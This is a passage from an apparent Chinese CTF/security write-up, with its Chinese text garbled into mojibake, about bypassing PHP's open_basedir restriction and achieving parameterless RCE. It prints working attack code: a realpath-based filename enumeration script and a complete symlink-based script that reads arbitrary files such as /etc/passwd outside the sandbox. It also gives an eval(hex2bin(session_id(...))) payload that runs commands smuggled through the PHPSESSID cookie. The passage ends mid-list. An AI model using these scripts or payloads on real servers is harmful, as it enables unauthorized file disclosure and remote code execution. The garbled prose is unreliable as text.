<p>realpath â€” è¿”å›è§„èŒƒåŒ–çš„ç»å¯¹è·¯å¾„åã€‚å®ƒå¯ä»¥å»æ‰å¤šä½™çš„../æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ã€‚</p>
<p>å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">realpath</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$path</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


        <h3 id="Bypass"   >
          <a href="#Bypass" class="heading-link"><i class="fas fa-link"></i></a><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3>
      <p>ç¯å¢ƒæ¡ä»¶ï¼šWindows</p>
<p>åŸºæœ¬åŸç†æ˜¯åŸºäºæŠ¥é”™è¿”å›å†…å®¹çš„ä¸ç”¨ï¼Œè®¾ç½®è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°ï¼Œå¾ªç¯éå†åŒ¹é…åˆ°æ­£åˆ™çš„æŠ¥é”™ä¿¡æ¯çš„å­—ç¬¦æ¥é€ä¸ªæ‹¼æ¥æˆå­˜åœ¨çš„æ–‡ä»¶åï¼Œå¦å¤–æ˜¯éœ€è¦ç»“åˆåˆ©ç”¨Windowsä¸‹çš„ä¸¤ä¸ªç‰¹æ®Šçš„é€šé…ç¬¦&lt;å’Œ&gt;ï¼Œä¸ç„¶åªèƒ½è¿›è¡Œæš´ç ´ã€‚</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;b>open_basedir: %s&lt;/b>&lt;br />"</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'isexists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'E:/wamp64/'</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$dir</span> <span class="token operator">.</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;>&lt;'</span><span class="token punctuation">;</span>
        <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">isexists</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
        <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/File\((.*)\) is not within/'</span><span class="token punctuation">;</span>
        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%s &lt;br/>"</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯ä»¥çœ‹åˆ°ï¼Œé¦–å­—æ¯ä¸åŒçš„æ–‡ä»¶å°±è¢«åˆ—å‡ºæ¥äº†ï¼Œé¦–å­—æ¯ç›¸åŒçš„æ–‡ä»¶ä¸­åªåˆ—äº†ç¬¬ä¸€ä¸ªï¼š</p>
<p><img src="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/10.png"></p>
</li>
</ol>
<p>æœ€åæ˜¯å¤§ä½¬è„šæœ¬</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/*
* by phithon
* From https://www.leavesongs.com
* detail: http://cxsecurity.com/issue/WLB-2009110068
*/</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type: text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir: %s\nphp_version: %s\n"</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">phpversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"disable_functions: %s\n"</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$relat_file</span> <span class="token operator">=</span> <span class="token function">getRelativePath</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$paths</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">999</span><span class="token punctuation">;</span>
<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">getRandStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$paths</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$relat_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$j</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">array_fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$j</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">symlink</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">array_fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">symlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">delfile</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$exp</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>
<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$exp</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n-----------------content---------------\n\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">delfile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">getRelativePath</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">,</span> <span class="token variable">$to</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// some compatibility fixes for Windows paths</span>
  <span class="token variable">$from</span> <span class="token operator">=</span> <span class="token function">rtrim</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\/'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span>
  <span class="token variable">$from</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$from</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$to</span>   <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token variable">$from</span>   <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$from</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$to</span>     <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$relPath</span>  <span class="token operator">=</span> <span class="token variable">$to</span><span class="token punctuation">;</span>

  <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$from</span> <span class="token keyword">as</span> <span class="token variable">$depth</span> <span class="token operator">=></span> <span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// find first non-matching dir</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token operator">===</span> <span class="token variable">$to</span><span class="token punctuation">[</span><span class="token variable">$depth</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// ignore this directory</span>
      <span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token variable">$relPath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// get number of remaining dirs to $from</span>
      <span class="token variable">$remaining</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$depth</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$remaining</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// add traversals up to first matching dir</span>
        <span class="token variable">$padLength</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$relPath</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$remaining</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$relPath</span> <span class="token operator">=</span> <span class="token function">array_pad</span><span class="token punctuation">(</span><span class="token variable">$relPath</span><span class="token punctuation">,</span> <span class="token variable">$padLength</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$relPath</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./'</span> <span class="token operator">.</span> <span class="token variable">$relPath</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$relPath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">delfile</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        @<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$mydir</span> <span class="token operator">=</span> @<span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> @<span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$mydir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">File_Str</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">delfile</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> 
        @<span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$mydir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        @<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> @<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">true</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">File_Str</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'//'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">getRandStr</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>
    <span class="token variable">$randStr</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$randStr</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$randStr</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>includeè¿œç¨‹æ–‡ä»¶åä¼ å‚fileå³å¯</p>
<p><strong>806</strong></p>

        <h3 id="phpæ— å‚RCE"   >
          <a href="#phpæ— å‚RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#phpæ— å‚RCE" class="headerlink" title="phpæ— å‚RCE"></a>phpæ— å‚RCE</h3>
      <p>é¦–å…ˆæ˜¯ä¸€ç¯‡å¯ä¾›å‚è€ƒçš„<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/106602261" >æ–‡ç« </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>åˆ©ç”¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§</p>
<ol>
<li><p><strong>åˆ©ç”¨session_id</strong></p>
<p>phpä¸­æœ‰ä¸€ä¸ªå‡½æ•°å«session_id(),å¯ä»¥ç›´æ¥è·å–åˆ°cookieä¸­çš„phpsessionidå€¼ï¼Œphpsessionidçš„ç»„æˆç¬¦å·æœ‰é™å®š,ä¸èƒ½ä½¿ç”¨ â€™ () â€˜ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤è½¬æ¢æˆ16è¿›åˆ¶ï¼Œç„¶åå†é€šè¿‡hex2binå‡½æ•°è½¬æ¢å›å»ï¼Œ<code>bin2hex(&#39;payload&#39;);</code>æ¥è½¬æ¢16ç¦æ­¢ï¼Œåœ¨ä½¿ç”¨æ—¶é€šè¿‡<code>eval(hex2bin(session_id(session_start())));</code>ï¼Œåœ¨åŠ ä¸Šè¯·æ±‚å¤´ä¸­Cookieä¸­çš„<code>PHPSESSID=16è¿›åˆ¶payload</code>æ‰§è¡Œ</p>
</li>
<li><p><strong>åˆ©ç”¨<code>get_defined_vars ()</code>å‡½æ•°</strong></p>
<p><code>get_defined_vars()</code>ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</p>
<p>å¯ä¾›åˆ©ç”¨çš„å‡½æ•°</p>
